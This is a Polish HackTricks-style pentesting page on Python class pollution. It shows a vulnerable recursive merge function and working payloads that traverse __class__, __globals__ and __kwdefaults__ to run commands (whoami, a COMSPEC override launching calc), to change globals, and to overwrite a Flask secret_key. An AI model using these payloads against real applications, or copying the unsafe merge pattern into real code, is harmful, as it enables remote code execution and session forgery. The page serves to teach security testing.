# Zanieczyszczenie klas (Zanieczyszczenie prototypów Pythona)

{{#include ../../banners/hacktricks-training.md}}

## Podstawowy przykład

Sprawdź, jak możliwe jest zanieczyszczenie klas obiektów za pomocą ciągów:
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## Podstawowy przykład podatności
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## Przykłady gadżetów

<details>

<summary>Tworzenie domyślnej wartości właściwości klasy do RCE (subprocess)</summary>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary>Zanieczyszczanie innych klas i zmiennych globalnych za pomocą <code>globals</code></summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>Arbitralne wykonywanie podprocesów</summary>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary>Nadpisywanie <strong><code>__kwdefaults__</code></strong></summary>

**`__kwdefaults__`** jest specjalnym atrybutem wszystkich funkcji, opartym na dokumentacji Pythona [documentation](https://docs.python.org/3/library/inspect.html), jest to „mapowanie wszelkich wartości domyślnych dla **tylko-słownikowych** parametrów”. Zanieczyszczenie tego atrybutu pozwala nam kontrolować wartości domyślne parametrów tylko-słownikowych funkcji, są to parametry funkcji, które pojawiają się po \* lub \*args.
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>Nadpisywanie sekretu Flask w różnych plikach</summary>

Więc, jeśli możesz przeprowadzić zanieczyszczenie klasy na obiekcie zdefiniowanym w głównym pliku python aplikacji webowej, ale **której klasa jest zdefiniowana w innym pliku** niż główny. Ponieważ aby uzyskać dostęp do \_\_globals\_\_ w poprzednich ładunkach, musisz uzyskać dostęp do klasy obiektu lub metod klasy, będziesz mógł **uzyskać dostęp do globals w tym pliku, ale nie w głównym**. \
Dlatego **nie będziesz mógł uzyskać dostępu do globalnego obiektu aplikacji Flask**, który zdefiniował **klucz sekretu** na głównej stronie:
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
W tym scenariuszu potrzebujesz gadżetu do przeszukiwania plików, aby dotrzeć do głównego, aby **uzyskać dostęp do globalnego obiektu `app.secret_key`**, aby zmienić klucz tajny Flask i móc [**eskalować uprawnienia** znając ten klucz](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Payload taki jak ten [z tego opisu](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Użyj tego ładunku, aby **zmienić `app.secret_key`** (nazwa w twojej aplikacji może być inna), aby móc podpisywać nowe i bardziej uprzywilejowane ciasteczka flask.

</details>

Sprawdź także następującą stronę w celu uzyskania dodatkowych gadżetów tylko do odczytu:

{{#ref}}
python-internal-read-gadgets.md
{{#endref}}

## Odniesienia

- [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

{{#include ../../banners/hacktricks-training.md}}
